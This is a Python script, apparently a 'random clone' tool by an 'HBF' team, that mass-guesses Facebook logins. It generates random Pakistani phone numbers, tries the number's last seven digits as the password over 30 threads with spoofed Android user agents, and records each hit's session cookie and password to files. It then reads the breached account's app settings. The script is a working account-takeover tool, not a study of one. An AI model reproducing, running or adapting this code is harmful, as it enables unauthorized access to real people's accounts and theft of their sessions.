from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python HAMII.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
HBF = '{ HBF }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
loop = 0
cps = []
oks = []
twf = []

def clear():
    os.system('clear')
    print(logo)
logo =f"""
{BLUE}==============================
{BLUE}=  ====  ==      ====        =    \033[1;32m 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪
{BLUE}=  ====  ==  ===  ===  =======
{BLUE}=  ====  ==  ====  ==  =======
{BLUE}=  ====  ==  ===  ===  =======      \033[1;32m 𓆩𝐁𝐑𝐔𝐓𝐄𓆪
{BLUE}=        ==      ====      ===
{BLUE}=  ====  ==  ===  ===  =======
{BLUE}=  ====  ==  ====  ==  =======      \033[1;32m 𓆩𝐅𝐎𝐑𝐂𝐄𓆪
{BLUE}=  ====  ==  ===  ===  =======
{BLUE}=  ====  ==      ====  =======
==============================
\033[1;37m╔ⒽⒷⒻ═════════════════\033[1;33m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m══════════════ⒽⒷⒻ╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m𝐌𝐔𝐇𝐀𝐌𝐌𝐀𝐃 𝐇𝐀𝐌𝐈𝐃 𝐊𝐇𝐀𝐖𝐀𝐉𝐀     \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m𝐌𝐔𝐇𝐀𝐌𝐌𝐀𝐃 𝐇𝐀𝐌𝐈𝐃 𝐊𝐇𝐀𝐖𝐀𝐉𝐀\033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝐇𝐚𝐦𝐢𝐢-𝐤𝐢𝐧𝐠-𝟎𝟔             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+923155912839             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.1                     \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m𝐇𝐀𝐌𝐈𝐈 𝐖𝐎𝐑𝐋𝐃             \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐓𝐘𝐏𝐄      \033[1;31m ➟   \033[1;32m𝐏𝐈𝐀𝐃                    \033[1;31m   │
\033[1;37m╚ⒽⒷⒻFACEBOOK TRICKS AND HELPING ZONE{ HBF }\033[1;37mⒽⒷⒻ╝
 
\033[1;91m=========================================================="""


#####     ####




def linex():
    print(f'{RED}==========================================================')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mHBF-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mHBF-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mHBF-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS 🎮%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[√] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS 🎮%s'%(ORANGE))
    else:
        print(f'\r 🎮  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[√]---------------------------------------------------[√]")
    #____________#
def xyz():
    os.system("play-audio WELCOME_TO_HAMI_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f"{RED}[01] {WHITE}RANDOM CLONE PAK  M1")
    print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
    hamii = input("[√] CHOOSE : ")
    if hamii in ["1","01"]:
        Tabii()
    elif hamii in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()

#_____________#
 
#_____________________#

def Tabii():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(' 0306 ,0300 ,0315 ,0333')
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {RED}"+tl)
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {RED}PAKISTAN 🇵🇰")
        print(f" {WHITE}NUMBER YOU PUT        : {RED}"+code)
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
        print(f" {WHITE}BE PATIENT.......")
        print(f" {WHITE}TO STOP PROCESS Ctrl + Z ")
        print(f'{RED}===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[HAMII-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/HAMII-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[HAMII-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/HAMII-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/HAMII-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[HAMII🤭] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass

        
 
if __name__ == '__main__':
    xyz()